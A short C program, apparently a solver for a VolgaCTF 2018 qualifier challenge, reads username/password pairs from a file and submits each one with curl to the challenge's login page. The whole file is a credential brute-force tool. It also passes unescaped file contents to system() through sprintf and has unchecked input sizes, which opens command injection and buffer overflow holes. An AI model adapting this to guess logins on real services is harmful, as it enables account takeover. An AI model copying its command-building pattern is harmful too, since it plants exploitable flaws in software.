#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

int main(int argc, char **argv) {
	FILE *fp = fopen("users.txt", "r");

	char username[51], password[51];
	int is_start = 0;

	while (fscanf(fp, "%s %s", username, password) != EOF) {
		if (!is_start) {
			if (!strcmp(username, argv[1])) {
				is_start = 1;
			} else {
				continue;
			}
		}

		char cmd[201];

		sprintf(cmd, "curl 'http://master.quals.2018.volgactf.ru:3333/' --data 'uname=%s&psw=%.26s&remember=on'", username, password);

		printf("%s %.26s\n", username, password);
		fflush(stdout);

		system(cmd);

		usleep(300000);

		putchar('\n');
	}

	return 0;
}
